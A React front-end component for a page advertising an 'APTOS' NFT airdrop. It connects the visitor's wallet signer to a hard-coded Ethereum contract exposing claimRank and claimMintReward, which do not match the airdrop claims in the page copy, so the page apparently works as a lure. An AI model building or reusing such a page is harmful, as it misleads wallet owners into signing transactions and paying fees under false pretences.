import squadcenter from '../squad-center.png';
import { ethers } from 'ethers';
import { useSigner, useAccount } from 'wagmi';
import Countdown from './Countdown';

function Main() {
  const { isDisconnected } = useAccount();
  const abi = [
    'function claimRank(uint256 term) external',
    'function claimMintReward() external',
  ];
  const { data: signer, isError, isLoading } = useSigner();

  const contract = new ethers.Contract(
    '0x5cD02e153494393fA94DD3c202f71F59665ba8B6',
    abi,
    signer
  );

  return (
    <section className="flex flex-col justify-around mt-20 lg:flex-row">
      <div className="flex ml-10 shrink-0">
        <img
          className="w-[360px] h-[360px] rounded-2xl"
          src={squadcenter}
          alt=""
        />
      </div>
      <div className="flex flex-col mt-5 ml-10 lg:mt-0">
        <h2 className="text-xl text-blue-300 ">Airdrop for</h2>
        <h1 className="text-4xl text-white ">APTOS</h1>
        <p className="text-left text-white">
          Reciving an NFT airdrop is only possible if you have a APTOS token in
          your wallet.
        </p>
        <p className="text-left text-white">
          You have to possess the token in order to recive on airdrop.
        </p>
        <p className="text-left text-white">
          There are no airdrop fees You pay network fees only to recive NFTs.
        </p>
        <p className="text-left text-white">
          The more tokens you have, the rarest NFTs you are going to get.
        </p>
        <div className="relative w-full bg-gray-200 rounded sm:w-1/2">
          <div
            style={{ width: 80 }}
            className="absolute top-0 h-4 rounded shim-blue"
          ></div>
        </div>
        <Countdown contract={contract} isDisconnected={isDisconnected} />
      </div>
    </section>
  );
}

export default Main;
